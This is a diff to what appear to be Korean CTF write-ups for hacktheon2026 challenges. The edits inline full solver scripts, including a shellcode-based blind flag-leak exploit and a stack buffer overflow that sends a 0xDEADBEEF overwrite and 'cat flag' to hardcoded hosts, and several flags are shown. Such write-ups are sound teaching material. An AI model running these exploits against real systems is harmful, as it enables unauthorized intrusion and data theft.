@@ -214,7 +214,146 @@ pray
 
 ## 7. 솔버 구성
 
-최종 코드는 [solve_cathedral_last_candle.py](</C:/Users/jinse/OneDrive/문서/New project/solve_cathedral_last_candle.py>) 에 작성했다.
+최종 코드는 
+
+```python
+          dist[start_state] = 0
+        queue = [start_state]
+
+        while queue:
+            state = min(queue, key=dist.__getitem__)
+            queue.remove(state)
+            mask, cur_val = state
+            cur_cost = dist[state]
+
+            ring_u = (cur_val + 1) % 3
+            hush_u = (cur_val - 1) % 3
+            for nxt, op in [((mask, ring_u), "ring"), ((mask, hush_u), "hush")]:
+                new_cost = cur_cost + 1
+                if new_cost < dist.get(nxt, 10**9):
+                    dist[nxt] = new_cost
+                    back[nxt] = (state, ExecStep(kind="self", op=op))
+                    if nxt not in queue:
+                        queue.append(nxt)
+
+            for idx, kid in enumerate(kids):
+                if mask & (1 << idx):
+                    continue
+                kid_plan_by_end = child_plans[kid][cur_val]
+                next_mask = mask | (1 << idx)
+                for child_parent_end, kid_plan in kid_plan_by_end.items():
+                    nxt = (next_mask, child_parent_end)
+                    new_cost = cur_cost + kid_plan.cost
+                    if new_cost < dist.get(nxt, 10**9):
+                        dist[nxt] = new_cost
+                        back[nxt] = (
+                            state,
+                            ExecStep(
+                                kind="child",
+                                child=kid,
+                                child_parent_start=cur_val,
+                                child_parent_end=child_parent_end,
+                            ),
+                        )
+                        if nxt not in queue:
+                            queue.append(nxt)
+
+        goal = (full_mask, 0)
+        if goal not in dist:
+            raise RuntimeError("no root plan found")
+
+        steps: list[ExecStep] = []
+        cur = goal
+        while cur != start_state:
+            prev, step = back[cur]
+            steps.append(step)
+            cur = prev
+        steps.reverse()
+        return NodePlan(cost=dist[goal], steps=steps)
+
+    def emit_nonroot(
+        self, node: tuple[int, int], parent_start: int, parent_end: int, cmds: list[str]
+    ) -> None:
+        plan = self.nonroot_plans(node)[parent_start][parent_end]
+        for step in plan.steps:
+            if step.kind == "self":
+                cmds.append(step.op)
+                continue
+            if step.kind != "child" or step.child is None:
+                raise RuntimeError("invalid child step")
+            move = self.direction_from_to(node, step.child)
+            cmds.append(f"go {move}")
+            self.emit_nonroot(
+                step.child,
+                step.child_parent_start,
+                step.child_parent_end,
+                cmds,
+            )
+            cmds.append(f"go {REV[move]}")
+
+    def emit_root(self, cmds: list[str]) -> None:
+        plan = self.root_plan()
+        for step in plan.steps:
+            if step.kind == "self":
+                cmds.append(step.op)
+                continue
+            if step.kind != "child" or step.child is None:
+                raise RuntimeError("invalid root child step")
+            move = self.direction_from_to(ROOT, step.child)
+            cmds.append(f"go {move}")
+            self.emit_nonroot(
+                step.child,
+                step.child_parent_start,
+                step.child_parent_end,
+                cmds,
+            )
+            cmds.append(f"go {REV[move]}")
+
+    def direction_from_to(self, src: tuple[int, int], dst: tuple[int, int]) -> str:
+        sr, sc = src
+        dr, dc = dst
+        for d, (rr, cc) in DIRS.items():
+            if (sr + rr, sc + cc) == dst:
+                return d
+        raise RuntimeError(f"{src} and {dst} are not adjacent")
+
+    def solve_commands(self) -> list[str]:
+        cmds: list[str] = []
+        self.emit_root(cmds)
+        cmds.append("pray")
+        return cmds
+
+    def run_solution(self, cmds: list[str]) -> str:
+        for cmd in cmds:
+            self.send(cmd)
+        return self.current_screen
+
+
+def extract_flag(text: str) -> str | None:
+    m = re.search(r"(hacktheon2026\{[^}\n]+\})", text)
+    return m.group(1) if m else None
+
+
+def main() -> None:
+    solver = Solver()
+    solver.connect()
+    solver.explore()
+    solver.validate_tree()
+    cmds = solver.solve_commands()
+    final_screen = solver.run_solution(cmds)
+    flag = extract_flag(final_screen)
+    print(f"budget_after={solver.budget}")
+    print(f"command_count={len(cmds)}")
+    print(final_screen)
+    if flag:
+        print(flag)
+    else:
+        print("flag not found")
+
+
+if __name__ == "__main__":
+    main()
+```
 
 흐름은 크게 세 단계다.
 
@@ -514,9 +653,160 @@ hacktheon2026{
 
 ## 사용한 스크립트
 
-재현용 스크립트는 아래 파일에 있다.
+재현용 스크립트는 다음과 같다.
 
-- `solve_even_made.py`
+```python
+#!/usr/bin/env python3
+from __future__ import annotations
+
+import argparse
+from typing import Iterable
+
+from pwn import context, p32, remote
+
+
+HOSTS = [
+    "13.124.201.116",
+    "54.181.1.133",
+    "43.201.41.138",
+]
+PORT = 1337
+
+# The known flag prefix lets us calibrate the stack slot used for even/odd bytes.
+KNOWN_PREFIX = b"hacktheon2026{"
+
+
+def build_payload(index: int, bit: int, even_pop: int, odd_pop: int) -> bytes:
+    if index % 2 == 0:
+        pops = even_pop
+        disp = 0x2E00 + index
+    else:
+        pops = odd_pop
+        disp = 0x2C85 + index
+
+    shellcode = b"\x58" * pops
+    shellcode += (b"\xD0\xA8" + p32(disp)) * (bit + 1)
+    shellcode += b"\x72\x02\x00\x00\xE2\xFE"
+
+    if any(byte & 1 for byte in shellcode):
+        raise ValueError("payload contains an odd byte")
+
+    return shellcode
+
+
+def query_bit(host: str, port: int, payload: bytes) -> int:
+    io = remote(host, port, timeout=5)
+    io.recvuntil(b": ")
+    io.send(payload)
+    data = io.recvall(timeout=2)
+    io.close()
+
+    if b"Alarm clock" in data:
+        return 1
+    if b"Segmentation fault" in data:
+        return 0
+
+    raise RuntimeError(f"unexpected response: {data!r}")
+
+
+def stable_query(host: str, port: int, payload: bytes, retries: int = 5) -> int:
+    last_error = None
+    for _ in range(retries):
+        try:
+            return query_bit(host, port, payload)
+        except Exception as exc:  # noqa: BLE001
+            last_error = exc
+    raise RuntimeError(f"query failed after {retries} retries") from last_error
+
+
+def find_pop_count(
+    host: str,
+    port: int,
+    index: int,
+    disp: int,
+    checks: Iterable[tuple[int, int]],
+    lower: int,
+    upper: int,
+) -> int:
+    matches: list[int] = []
+    for pop_count in range(lower, upper + 1):
+        ok = True
+        for bit, expected in checks:
+            payload = b"\x58" * pop_count
+            payload += (b"\xD0\xA8" + p32(disp)) * (bit + 1)
+            payload += b"\x72\x02\x00\x00\xE2\xFE"
+            if any(byte & 1 for byte in payload):
+                ok = False
+                break
+            if stable_query(host, port, payload) != expected:
+                ok = False
+                break
+        if ok:
+            matches.append(pop_count)
+
+    if len(matches) != 1:
+        raise RuntimeError(f"calibration failed for index {index}: {matches}")
+
+    return matches[0]
+
+
+def calibrate(host: str, port: int) -> tuple[int, int]:
+    even_pop = find_pop_count(
+        host,
+        port,
+        index=0,
+        disp=0x2E00,
+        checks=((0, 0), (3, 1), (5, 1)),
+        lower=1,
+        upper=64,
+    )
+    odd_pop = find_pop_count(
+        host,
+        port,
+        index=1,
+        disp=0x2C86,
+        checks=((0, 1), (1, 0), (5, 1), (6, 1)),
+        lower=1,
+        upper=32,
+    )
+    return even_pop, odd_pop
+
+
+def recover_flag(host: str, port: int, even_pop: int, odd_pop: int) -> bytes:
+    flag = bytearray()
+    for index in range(0x50):
+        value = 0
+        for bit in range(8):
+            payload = build_payload(index, bit, even_pop, odd_pop)
+            value |= stable_query(host, port, payload) << bit
+        flag.append(value)
+        print(f"{index:02d}: {bytes(flag)!r}")
+        if value == ord("}"):
+            break
+    return bytes(flag)
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    parser.add_argument("host", nargs="?", default=HOSTS[0])
+    parser.add_argument("--port", type=int, default=PORT)
+    args = parser.parse_args()
+
+    context.log_level = "error"
+
+    even_pop, odd_pop = calibrate(args.host, args.port)
+    print(f"even_pop={even_pop} odd_pop={odd_pop}")
+
+    flag = recover_flag(args.host, args.port, even_pop, odd_pop)
+    print(flag.decode())
+
+    if not flag.startswith(KNOWN_PREFIX):
+        raise SystemExit("recovered flag does not match expected prefix")
+
+
+if __name__ == "__main__":
+    main()
+```
 
 실행 예시는 다음과 같다.
 
@@ -664,9 +954,74 @@ payload = b"A" * 0x80 + (0xDEADBEEF).to_bytes(4, "little")
 
 ## 익스플로잇 스크립트
 
-사용한 스크립트는 다음 파일에 정리해 두었다.
+사용한 스크립트는 다음과 같다.
 
-- `solve_immutable.py`
+```python
+import socket
+import sys
+import time
+
+
+TARGETS = [
+    ("3.37.44.62", 33201),
+    ("13.125.202.251", 33201),
+]
+
+
+def recv_some(sock, delay=0.2):
+    time.sleep(delay)
+    chunks = []
+    while True:
+        try:
+            data = sock.recv(4096)
+        except TimeoutError:
+            break
+        if not data:
+            break
+        chunks.append(data)
+        if len(data) < 4096:
+            break
+    return b"".join(chunks)
+
+
+def exploit(host, port):
+    payload = b"A" * 0x80 + (0xDEADBEEF).to_bytes(4, "little")
+
+    with socket.create_connection((host, port), timeout=5) as sock:
+        sock.settimeout(1)
+        banner = recv_some(sock, 0.1)
+        sock.sendall(payload + b"\n")
+        won = recv_some(sock, 0.2)
+        sock.sendall(b"cat flag\nexit\n")
+        result = recv_some(sock, 0.5)
+        return banner + won + result
+
+
+def main():
+    targets = TARGETS
+    if len(sys.argv) == 3:
+        targets = [(sys.argv[1], int(sys.argv[2]))]
+
+    last_error = None
+    for host, port in targets:
+        try:
+            output = exploit(host, port)
+        except OSError as exc:
+            last_error = exc
+            print(f"[!] {host}:{port} failed: {exc}", file=sys.stderr)
+            continue
+
+        print(output.decode("latin-1", errors="replace"), end="")
+        if b"hacktheon2026{" in output:
+            return
+
+    if last_error:
+        raise SystemExit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
 
 핵심 로직은 아래와 같다.
 
@@ -974,9 +1329,6 @@ hacktheon2026{the_plotter_reveals_its_secret_through_sound}
 ---
 
 ## 최종 풀이 코드 예시
-
-아래 코드는 내가 사용한 흐름을 정리한 축약 버전이다.  
-실제 제출용으로는 충분히 재현 가능한 수준이다.
 
 ```python
 import struct
@@ -1300,7 +1652,7 @@ hacktheon2026{ovajumher0erwkl28_i8eecp!hb5enitsj6ly5hx05qel7a2z1gb6y8vi4fd4l93}
 
 ---
 
-## 1. Initial Recon
+## 1. Until Execute
 
 먼저 압축을 풀고 기본 정보를 확인했다.
 
